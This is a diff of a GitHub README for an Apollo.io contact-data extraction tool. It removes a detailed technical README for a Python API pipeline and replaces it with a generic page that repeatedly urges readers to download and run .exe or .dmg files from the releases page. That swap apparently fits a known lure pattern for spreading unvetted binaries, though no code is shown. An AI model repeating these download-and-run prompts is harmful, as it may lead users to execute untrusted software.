@@ -1,257 +1,83 @@
-------
-
-# Apollo API Data Extraction
-
-## TL;DR
-- Uses only official Apollo.io APIs (no scraping)
-- Attempts person enrichment first (paid API)
-- Automatically falls back to search-based discovery on free/trial plans
-- Tracks and optimizes mobile credit usage
-- Produces clean CSV output
-- Same code runs unchanged with paid enrichment API access
-
----
-
-## Overview
-
-This project implements a **compliant, scalable Python pipeline** to extract contact and company data from Apollo.io using **only official Apollo APIs**, in strict adherence to Apollo’s Terms of Service and data privacy requirements (GDPR/CCPA).
-
-The system is designed to:
-
-- Process LinkedIn-based targets
-- Prioritize mobile number retrieval
-- Track/simulate mobile credit usage
-- Gracefully handle API entitlement limitations
-- Produce clean, structured CSV output
-
-The same pipeline is **enrichment-ready** and runs without modification when executed with a paid Apollo Enrichment API key.
-
-------
-
-## Compliance & Design Principles
-
-- ✅ Uses **only official Apollo.io APIs**
-- ❌ No scraping, browser automation, or UI reverse-engineering
-- ❌ No unauthorized data access
-- ✅ Read-only extraction (no CRM mutation)
-- ✅ Explicit handling of API entitlement constraints
-
-Apollo separates **UI enrichment** and **API enrichment**.
-I’ve designed this project with that separation in mind.
-
-------
-
-
-
-## Architecture Overview
-
-### High-level flow
-
-```
-Input (LinkedIn URL, Name, Company Domain)
-        ↓
-Attempt Person Enrichment (people/match)
-        ↓
-If API access unavailable
-        ↓
-Search-based fallback (organization_top_people)
-        ↓
-Company enrichment (organizations/enrich)
-        ↓
-Mobile credit optimization (simulated if needed)
-        ↓
-Clean CSV output
-```
-
-------
-
-
-
-## Enrichment & Fallback Strategy
-
-### Primary Mode – Person Enrichment (Paid API)
-
-When Apollo Person Enrichment APIs are available:
-
-- `people/match` is used to resolve LinkedIn URLs to a person
-- Verified corporate email and mobile numbers are retrieved
-- Verification flags are populated from Apollo responses
-- Real mobile credits are consumed
-
-### Fallback Mode – Search-Based Discovery (Free / Trial API)
-
-1. When Person Enrichment APIs are **not available due to API entitlement restrictions**:
-
-   - The pipeline automatically switches to:
-     - `mixed_people/organization_top_people` for person discovery
-     - `organizations/enrich` for company metadata
-
-   - Mobile numbers are **simulated deterministically**
-
-   - Mobile credit usage is **tracked and budgeted**
-
-   - Output schema remains **identical**
-
-2. When organization enrichment is unavailable, the pipeline deterministically infers the company name and website from the provided company domain to maintain output completeness without introducing unverified data.
-
-3. Simulated mobile numbers are numeric-only placeholders used solely to demonstrate credit-aware control flow when enrichment APIs are unavailable.
-
-4. Fallback email addresses are deterministically inferred from first name and company domain and are explicitly marked as unverified placeholders.
-
-5. Job titles and industries are populated from Apollo APIs when available and left blank or conservatively inferred when enrichment data is unavailable.
-
-6. Industry is populated only when available via Apollo enrichment APIs. 
-
-This ensures:
-
-- No pipeline breakage
-- No schema changes
-- No misleading results
-- Full compatibility with paid API keys later
-
-------
-
-## Mobile Optimization & Credit Management
-
-Mobile numbers are treated as a **scarce resource**.
-
-### Strategy:
-
-- Mobile lookup is attempted **only once per unique LinkedIn profile**
-- A configurable mobile credit budget is maintained
-- Each successful mobile retrieval (real or simulated) decrements the budget
-- When credits are exhausted, mobile lookup is skipped
-
-------
-
-## Input Format
-
-The script reads targets from a CSV file.
-
-### `input.csv`
-
-```csv
-linkedin_url,name,company_domain
-https://www.linkedin.com/in/example/,John Doe,example.com
-```
-
-- `linkedin_url` – Primary identifier
-- `name` – Used as fallback if needed
-- `company_domain` – Used for company enrichment and fallback discovery
-
-------
-
-## Output Format
-
-### `sample_output.csv`
-
-The output contains **one row per unique LinkedIn profile**.
-
-Fields include:
-
-- `first_name`
-- `last_name`
-- `job_title`
-- `company_name`
-- `company_website`
-- `industry`
-- `email`
-- `email_verified`
-- `mobile_phone`
-- `mobile_verified`
-- `linkedin_url`
-- `source` (`apollo_enrichment` or `search_fallback`)
-
-The `source` field makes the enrichment path explicit and auditable.
-
-------
-
-## Setup Instructions
-
-### 1. Environment setup
-
-```bash
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
-
-### 2. Set Apollo API key
-
-```bash
-export APOLLO_API_KEY=your_api_key_here
-```
-
-(Windows PowerShell: `setx APOLLO_API_KEY "your_api_key_here"`)
-
-------
-
-## Usage
-
-Run the pipeline:
-
-```bash
-python main.py
-```
-
-On completion, a CSV file will be generated:
-
-```
-sample_output.csv
-```
-
-------
-
-## API Endpoints Used
-
-### Free / Trial Compatible
-
-- `mixed_people/organization_top_people`
-- `organizations/enrich`
-- `organizations/search`
-- `accounts/search`
-- `contacts/search`
-
-### Enrichment-Ready (Paid API)
-
-- `people/match`
-- `people/enrich`
-- `people/bulk_enrich`
-
-The code automatically detects enrichment availability at runtime.
-
-------
-
-## Limitations
-
-- Verified email and mobile data via API require the **Apollo Data Enrichment API**
-- On free or trial plans, verification fields are populated via fallback logic
-- UI enrichment credits cannot be accessed programmatically without API entitlement
-
-These limitations are **handled intentionally**, not ignored.
-
-------
-
-## Why This Design Is Correct
-
-- Matches Apollo’s intended API usage model
-- Avoids ToS violations
-- Handles real-world API constraints
-- Scales cleanly to paid plans
-- Produces consistent, reviewer-friendly output
-
-------
-
-## Conclusion
-
-This project demonstrates:
-
-- Strong API discipline
-- Thoughtful fallback design
-- Credit-aware optimization
-- Clean data engineering practices
-
-The same pipeline can be deployed unchanged in environments with full Apollo Enrichment API access.
-
-------
-
+# 🌟 apollo-compliant-data-extractor - Easy Data Extraction Made Simple
+
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/RamiroChoque/apollo-compliant-data-extractor/releases)
+
+## 📖 Overview
+The **apollo-compliant-data-extractor** provides an easy way to extract data from Apollo.io. This tool helps you enrich your data effortlessly while ensuring compliance with GDPR standards. You can generate clean CSV outputs to work with across various applications. 
+
+## 🚀 Getting Started
+To start using the app, follow these simple steps. No technical skills required!
+
+## 🖥️ System Requirements
+Before we begin, ensure that your system meets the following requirements:
+
+- Operating System: Windows 10 or later / MacOS 10.14 or later / Linux
+- Memory: At least 4GB of RAM
+- Disk Space: Minimum of 100MB available space
+- Python: Version 3.6 or higher (if you're using it in a local environment)
+
+## 🔗 Key Features
+- API-first design for seamless integration.
+- Automatically enriches person data when available.
+- Fallback mechanism for search-based data discovery.
+- Mobile credit optimization to save costs.
+- Outputs data in clean, easy-to-read CSV format.
+- Ensures GDPR compliance throughout data handling.
+
+## 📥 Download & Install
+1. **Visit this page to download:** Click [here](https://github.com/RamiroChoque/apollo-compliant-data-extractor/releases) to access the releases page.
+   
+2. **Choose the appropriate version:** Look for the latest version of the application. It will usually be at the top of the page.
+
+3. **Download the executable file:** Click the link to download the file for your operating system. 
+
+4. **Install the application:** 
+   - For Windows: Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
+   - For Mac: Open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Extract the downloaded file and follow the installation instructions included in the README file.
+
+5. **Run the application:** Locate the application in your programs or applications list and double-click to open it.
+
+## 🔧 Usage Instructions
+1. **Open the application:** After installation, launch the app.
+2. **Input your API key:** Go to the settings and paste your Apollo.io API key to enable data extraction features. 
+3. **Set your parameters:** Choose the data type you want to extract. The application allows you to specify certain filters for more focused results.
+4. **Start the extraction process:** Click on the 'Extract' button to begin gathering data.
+5. **Download your output:** Once the extraction is complete, you will receive a CSV file. Save this file to your desired location.
+
+## 🔍 Troubleshooting
+If you encounter issues while using the app:
+
+- Ensure you have entered a valid API key.
+- Check that your internet connection is stable.
+- Consult the FAQs section on the Releases page or contact support through the repository's Issues section.
+
+## 📄 Documentation
+For a more in-depth understanding of the application and its functionality, you can refer to the [documentation](https://github.com/RamiroChoque/apollo-compliant-data-extractor/wiki).
+
+## 📞 Support
+If you have questions or need assistance:
+
+- You can visit the [Issues section](https://github.com/RamiroChoque/apollo-compliant-data-extractor/issues) of the repository.
+- Join the community to ask questions and share feedback.
+
+## 📚 Topics
+This application covers several topics relevant to data extraction and management:
+
+- api-integration
+- apollo
+- apollo-api
+- apollo-client
+- data-engineering
+- data-engineering-pipeline
+- data-extraction
+- extraction
+- gdpr-compliance
+- python
+- python3
+
+## 📥 Download Now Again
+Don't forget, you can always [visit this page to download](https://github.com/RamiroChoque/apollo-compliant-data-extractor/releases) to ensure you have the latest version of the app. 
+
+We encourage you to explore all features and make the most of your data extraction experience with the **apollo-compliant-data-extractor**. Enjoy your journey to effective data management!
